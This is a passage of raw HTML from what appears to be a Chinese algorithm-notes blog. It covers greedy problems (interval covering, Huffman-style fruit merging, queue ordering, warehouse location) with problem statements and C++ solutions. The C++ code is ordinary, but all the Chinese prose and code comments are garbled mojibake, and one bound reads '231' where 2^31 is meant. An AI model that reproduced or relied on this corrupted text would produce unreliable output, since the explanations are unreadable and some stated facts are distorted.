cnt</p><blockquote><p>è°ƒæ•´æ³•ï¼šæ‰¾åˆ°anså¯¹åº”é€‰æ‹©çš„åŒºé—´ä¸cntå¯¹åº”åŒºé—´çš„ç¬¬ä¸€ä¸ªä¸åŒçš„åŒºé—´ï¼Œä¸€å®šèƒ½å°†ansä¸­è¿™ä¸ªåŒºé—´æ›¿æ¢ä¸ºcntæ–¹æ¡ˆä¸­çš„åŒºé—´ï¼Œæ›¿æ¢åå¾ªç¯ä¸‹å»â€¦<br>æœ€åanså¯¹åº”æ–¹æ¡ˆå’Œcntä¸­å®Œå…¨ä¸€è‡´</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> l &lt; W.l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> st, ed;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;st, &amp;ed);</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> j = i, r = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; n &amp;&amp; ranges[j].l &lt;= st) &#123;</span><br><span class="line">      r = <span class="built_in">max</span>(r, ranges[j].r);</span><br><span class="line">      j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (r &lt; st) &#123;</span><br><span class="line">      res = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res++;</span><br><span class="line">    <span class="keyword">if</span> (r &gt;= ed) &#123;</span><br><span class="line">      success = <span class="literal">true</span>;  <span class="comment">// ä¸€å®šè¦success, å¾ªç¯ç»“æŸåå¯èƒ½è¿˜æ²¡è¦†ç›–ed</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    st = r;</span><br><span class="line">    i = j - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!success) res = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Huffmanæ ‘">Huffmanæ ‘</h1><h2 id="AcWing-148-åˆå¹¶æœå­">AcWing 148. åˆå¹¶æœå­</h2><blockquote><p>ä¸DPç« ä¸­â€œåˆå¹¶çŸ³å­â€ä¸åŒæŒ‡å‡ºåœ¨äºï¼šåˆå¹¶çŸ³å­å¿…é¡»æ˜¯ç›¸é‚»ä¸¤å †ï¼Œè€Œåˆå¹¶æœå­å¯ä»¥ä¸ç›¸é‚»ã€‚</p></blockquote><p>åœ¨ä¸€ä¸ªæœå›­é‡Œï¼Œè¾¾è¾¾å·²ç»å°†æ‰€æœ‰çš„æœå­æ‰“äº†ä¸‹æ¥ï¼Œè€Œä¸”æŒ‰æœå­çš„ä¸åŒç§ç±»åˆ†æˆäº†ä¸åŒçš„å †ã€‚</p><p>è¾¾è¾¾å†³å®šæŠŠæ‰€æœ‰çš„æœå­åˆæˆä¸€å †ã€‚</p><p>æ¯ä¸€æ¬¡åˆå¹¶ï¼Œè¾¾è¾¾å¯ä»¥æŠŠä¸¤å †æœå­åˆå¹¶åˆ°ä¸€èµ·ï¼Œæ¶ˆè€—çš„ä½“åŠ›ç­‰äºä¸¤å †æœå­çš„é‡é‡ä¹‹å’Œã€‚</p><p>å¯ä»¥çœ‹å‡ºï¼Œæ‰€æœ‰çš„æœå­ç»è¿‡ nâˆ’1 æ¬¡åˆå¹¶ä¹‹åï¼Œå°±åªå‰©ä¸‹ä¸€å †äº†ã€‚</p><p>è¾¾è¾¾åœ¨åˆå¹¶æœå­æ—¶æ€»å…±æ¶ˆè€—çš„ä½“åŠ›ç­‰äºæ¯æ¬¡åˆå¹¶æ‰€è€—ä½“åŠ›ä¹‹å’Œã€‚</p><p>å› ä¸ºè¿˜è¦èŠ±å¤§åŠ›æ°”æŠŠè¿™äº›æœå­æ¬å›å®¶ï¼Œæ‰€ä»¥è¾¾è¾¾åœ¨åˆå¹¶æœå­æ—¶è¦å°½å¯èƒ½åœ°èŠ‚çœä½“åŠ›ã€‚</p><p>å‡å®šæ¯ä¸ªæœå­é‡é‡éƒ½ä¸º 1ï¼Œå¹¶ä¸”å·²çŸ¥æœå­çš„ç§ç±»æ•°å’Œæ¯ç§æœå­çš„æ•°ç›®ï¼Œä½ çš„ä»»åŠ¡æ˜¯è®¾è®¡å‡ºåˆå¹¶çš„æ¬¡åºæ–¹æ¡ˆï¼Œä½¿è¾¾è¾¾è€—è´¹çš„ä½“åŠ›æœ€å°‘ï¼Œå¹¶è¾“å‡ºè¿™ä¸ªæœ€å°çš„ä½“åŠ›è€—è´¹å€¼ã€‚</p><p>ä¾‹å¦‚æœ‰ 3 ç§æœå­ï¼Œæ•°ç›®ä¾æ¬¡ä¸º 1ï¼Œ2ï¼Œ9ã€‚</p><p>å¯ä»¥å…ˆå°† 1ã€2 å †åˆå¹¶ï¼Œæ–°å †æ•°ç›®ä¸º 3ï¼Œè€—è´¹ä½“åŠ›ä¸º 3ã€‚</p><p>æ¥ç€ï¼Œå°†æ–°å †ä¸åŸå…ˆçš„ç¬¬ä¸‰å †åˆå¹¶ï¼Œåˆå¾—åˆ°æ–°çš„å †ï¼Œæ•°ç›®ä¸º 12ï¼Œè€—è´¹ä½“åŠ›ä¸º 12ã€‚</p><p>æ‰€ä»¥è¾¾è¾¾æ€»å…±è€—è´¹ä½“åŠ›=3+12=15ã€‚</p><p>å¯ä»¥è¯æ˜ 15 ä¸ºæœ€å°çš„ä½“åŠ›è€—è´¹å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥åŒ…æ‹¬ä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•° nï¼Œè¡¨ç¤ºæœå­çš„ç§ç±»æ•°ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« n ä¸ªæ•´æ•°ï¼Œç”¨ç©ºæ ¼åˆ†éš”ï¼Œç¬¬ i ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ˜¯ç¬¬ i ç§æœå­çš„æ•°ç›®ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºåŒ…æ‹¬ä¸€è¡Œï¼Œè¿™ä¸€è¡ŒåªåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œä¹Ÿå°±æ˜¯æœ€å°çš„ä½“åŠ›è€—è´¹å€¼ã€‚</p><p>è¾“å…¥æ•°æ®ä¿è¯è¿™ä¸ªå€¼å°äº 231ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>b</mi><mo>â‰¤</mo><mn>10000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le b\le 10000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10000</span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><msub><mi>a</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>20000</mn></mrow><annotation encoding="application/x-tex">1\le a_i\le 20000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3 </span><br><span class="line">1 2 9 </span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-5">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong></p><p>æ¯æ¬¡é€‰æ‹©é‡é‡æœ€å°çš„2å †åˆå¹¶</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; heap;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    heap.<span class="built_in">push</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (heap.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> a = heap.<span class="built_in">top</span>(); heap.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> b = heap.<span class="built_in">top</span>(); heap.<span class="built_in">pop</span>();</span><br><span class="line">    res += (a + b);</span><br><span class="line">    heap.<span class="built_in">push</span>(a + b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);  <span class="comment">// %lld</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ’åºä¸ç­‰å¼">æ’åºä¸ç­‰å¼</h1><h2 id="AcWing-913-æ’é˜Ÿæ‰“æ°´">AcWing 913. æ’é˜Ÿæ‰“æ°´</h2><p>æœ‰ n ä¸ªäººæ’é˜Ÿåˆ° 1 ä¸ªæ°´é¾™å¤´å¤„æ‰“æ°´ï¼Œç¬¬ i ä¸ªäººè£…æ»¡æ°´æ¡¶æ‰€éœ€çš„æ—¶é—´æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¯·é—®å¦‚ä½•å®‰æ’ä»–ä»¬çš„æ‰“æ°´é¡ºåºæ‰èƒ½ä½¿æ‰€æœ‰äººçš„ç­‰å¾…æ—¶é—´ä¹‹å’Œæœ€å°ï¼Ÿ</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° nã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« n ä¸ªæ•´æ•°ï¼Œå…¶ä¸­ç¬¬ i ä¸ªæ•´æ•°è¡¨ç¤ºç¬¬ i ä¸ªäººè£…æ»¡æ°´æ¡¶æ‰€èŠ±è´¹çš„æ—¶é—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å°çš„ç­‰å¾…æ—¶é—´ä¹‹å’Œã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le n\le 10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><msub><mi>t</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>4</mn></msup></mrow><annotation encoding="application/x-tex">1\le t_i\le 10^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7</span><br><span class="line">3 6 1 4 2 5 7</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-6">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong> ç”¨æ—¶çŸ­çš„æ”¾åœ¨å‰é¢ã€‚ï¼ˆç»“åˆå…¬å¼ + è°ƒæ•´æ³•æ˜“è¯ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(a, a + n);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="comment">// ä¸‹æ ‡ä¸ºiçš„ç¬¬(i+1)ä¸ªäººåä¼šæœ‰(n-i-1)ä¸ªäººéœ€è¦ç­‰è¿™ä¸ªa[i]æ—¶é—´</span></span><br><span class="line">    res += a[i] * (n - i - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç»å¯¹å€¼ä¸ç­‰å¼">ç»å¯¹å€¼ä¸ç­‰å¼</h1><h2 id="AcWing-104-è´§ä»“é€‰å€">AcWing 104. è´§ä»“é€‰å€</h2><p>åœ¨ä¸€æ¡æ•°è½´ä¸Šæœ‰ N å®¶å•†åº—ï¼Œå®ƒä»¬çš„åæ ‡åˆ†åˆ«ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>âˆ¼</mo><msub><mi>A</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">A_1\sim A_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>ç°åœ¨éœ€è¦åœ¨æ•°è½´ä¸Šå»ºç«‹ä¸€å®¶è´§ä»“ï¼Œæ¯å¤©æ¸…æ™¨ï¼Œä»è´§ä»“åˆ°æ¯å®¶å•†åº—éƒ½è¦è¿é€ä¸€è½¦å•†å“ã€‚</p><p>ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæ±‚æŠŠè´§ä»“å»ºåœ¨ä½•å¤„ï¼Œå¯ä»¥ä½¿å¾—è´§ä»“åˆ°æ¯å®¶å•†åº—çš„è·ç¦»ä¹‹å’Œæœ€å°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œè¾“å…¥æ•´æ•° Nã€‚</p><p>ç¬¬äºŒè¡Œ N ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>âˆ¼</mo><msub><mi>A</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">A_1\sim A_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºè·ç¦»ä¹‹å’Œçš„æœ€å°å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math 